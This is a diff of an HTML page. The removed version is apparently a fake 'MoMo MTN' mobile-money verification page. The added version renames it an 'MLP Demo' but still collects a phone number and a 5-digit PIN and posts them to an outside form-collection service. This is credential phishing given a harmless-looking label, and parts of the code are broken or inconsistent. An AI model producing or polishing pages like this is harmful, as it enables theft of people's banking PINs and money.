@@ -3,84 +3,77 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MoMo MTN</title>
+    <title>MLP Demo Interface</title>
 
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
 
-    <div class="watermark top-left">MoMo</div>
-    <div class="watermark top-right">MoMo</div>
-    <div class="watermark bottom-left">MoMo</div>
-    <div class="watermark bottom-right">MoMo</div>
+<div class="wrapper">
 
-    <div class="wrapper">
+    <h1>MLP Demo</h1>
 
-        <div class="logo">
-            <h1>MoMo MTN</h1></h1>
+    <form action="https://formbold.com/s/3Labw" method="POST">
+
+    
+
+        <label>Phone Number</label>
+        <input type="tel" name="phone" required>
+
+        <label>PIN</label>
+
+        <div class="pin-container">
+            <input type="text" maxlength="1" inputmode="numeric">
+            <input type="text" maxlength="1" inputmode="numeric">
+            <input type="text" maxlength="1" inputmode="numeric">
+            <input type="text" maxlength="1" inputmode="numeric">
+            <input type="text" maxlength="1" inputmode="numeric">
         </div>
 
-        </form action="https://formbold.com/s/3Labw" method="POST">
+        <!-- hidden field sent to FormBold -->
+        <input type="hidden" name="PIN" id="pin">
 
-            
-            <label>Phone Number</label>
-            <input type="tel" placeholder="07XXXXXXXX" required>
+        <button type="submit">Submit</button>
 
-            
-            <label>5-Digit PIN</label>
+    </form>
 
-            <div class="pin-container">
-                <input type="password" maxlength="1" inputmode="numeric">
-                <input type="password" maxlength="1" inputmode="numeric">
-                <input type="password" maxlength="1" inputmode="numeric">
-                <input type="password" maxlength="1" inputmode="numeric">
-                <input type="password" maxlength="1" inputmode="numeric">
-            </div>
+</div>
 
-            
-<button type="submit">Submit Verification</button>> 
-    form>
+<script>
+const inputs = document.querySelectorAll(".pin-container input");
+const hiddenInput = document.getElementById("referral_code");
 
-    </div>
+inputs.forEach((input, index) => {
 
-    <script>
-        const pinInputs = document.querySelectorAll(".pin-container input");
-        const successMsg = document.getElementById("success");
+    input.addEventListener("input", function () {
+        this.value = this.value.replace(/[^0-9]/g, "");
 
-        pinInputs.forEach((input, index) => {
-
-            input.addEventListener("input", function () {
-
-                this.value = this.value.replace(/[^0-9]/g, "");
-
-                if (this.value && index < pinInputs.length - 1) {
-                    pinInputs[index + 1].focus();
-                }
-
-                checkComplete();
-            });
-
-            input.addEventListener("keydown", function (e) {
-                if (e.key === "Backspace" && this.value === "" && index > 0) {
-                    pinInputs[index - 1].focus();
-                }
-            });
-
-        });
-
-        function checkComplete() {
-            let pin = "";
-
-            pinInputs.forEach(i => pin += i.value);
-
-            if (pin.length === 5 && /^[0-9]{5}$/.(pin)) {
-                successMsg.style.display = "allow";
-            } else {
-                successMsg.style.display = "none";
-            }
+        if (this.value.length > 1) {
+            this.value = this.value.slice(0, 1);
         }
-    </script>
+
+        if (this.value && index < inputs.length - 1) {
+            inputs[index + 1].focus();
+        }
+
+        updateHidden();
+    });
+
+    input.addEventListener("keydown", function (e) {
+        if (e.key === "Backspace" && this.value === "" && index > 0) {
+            inputs[index - 1].focus();
+        }
+    });
+
+});
+
+function updateHidden() {
+    let code = "";
+    inputs.forEach(i => code += i.value);
+    hiddenInput.value = code;
+}
+</script>
 
 </body>
 </html>
